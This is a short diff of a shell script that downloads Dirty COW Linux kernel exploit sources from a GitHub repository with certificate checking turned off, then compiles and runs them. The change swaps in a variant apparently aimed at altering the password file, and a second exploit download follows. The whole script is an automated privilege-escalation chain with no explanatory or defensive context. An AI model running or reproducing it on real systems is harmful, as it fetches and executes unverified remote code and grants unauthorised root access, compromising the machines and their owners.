@@ -2,9 +2,9 @@
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
 export PATH
 
-wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirtyc0w.c -O dirtyc0w.c
-gcc -pthread dirtyc0w.c -o dirtyc0w
-./dirtyc0w
+wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/dirty_passwd_adjust_cow.c -O dirty_passwd_adjust_cow.c
+gcc -pthread dirty_passwd_adjust_cow.c -o dirty_passwd_adjust_cow
+./dirty_passwd_adjust_cow
 
 wget --no-check-certificate https://raw.githubusercontent.com/viagram/vipjiexi/master/c0w.c -O c0w.c
 gcc -pthread c0w.c -o c0w
